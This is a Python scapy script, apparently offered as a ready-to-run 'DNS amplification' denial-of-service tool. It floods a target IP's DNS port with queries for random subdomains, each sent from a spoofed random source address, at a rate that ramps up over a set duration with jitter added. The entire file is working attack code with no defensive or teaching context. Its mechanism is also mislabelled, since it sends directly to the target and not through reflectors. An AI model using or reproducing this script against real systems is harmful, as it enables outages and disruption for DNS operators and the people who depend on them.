#!/usr/bin/env python3
import scapy.all as scapy
import random
import time
import sys
import string

record_types = ["A", "AAAA", "TXT"]

def random_domain():
    sub = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
    return f"{sub}.example.com"


def attack_profile(duration):
    start = time.time()
    while True:
        elapsed = time.time() - start
        if elapsed > duration:
            break
        phase = elapsed / duration
        yield 0.3 + (phase * 1.0)


def dns_amplification(target_ip, duration):

    base_rate = 30
    peak_rate = 600

    for intensity in attack_profile(duration):

        current_rate = base_rate + (peak_rate - base_rate) * intensity

        pkt = (
            scapy.IP(
                src=f"{random.randint(1,223)}.{random.randint(0,50)}.{random.randint(0,255)}.{random.randint(1,254)}",
                dst=target_ip
            ) /
            scapy.UDP(
                sport=random.randint(1024, 65535),
                dport=53
            ) /
            scapy.DNS(
                rd=1,
                qd=scapy.DNSQR(
                    qname=random_domain(),
                    qtype=random.choice(record_types)
                )
            )
        )

        scapy.send(pkt, verbose=0)

        sleep_time = max(0.001, 1.0 / current_rate)
        sleep_time *= random.uniform(0.6, 1.5)
        time.sleep(sleep_time)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: dns_amplification.py <target_ip> <duration>")
        sys.exit(1)

    dns_amplification(sys.argv[1], int(sys.argv[2]))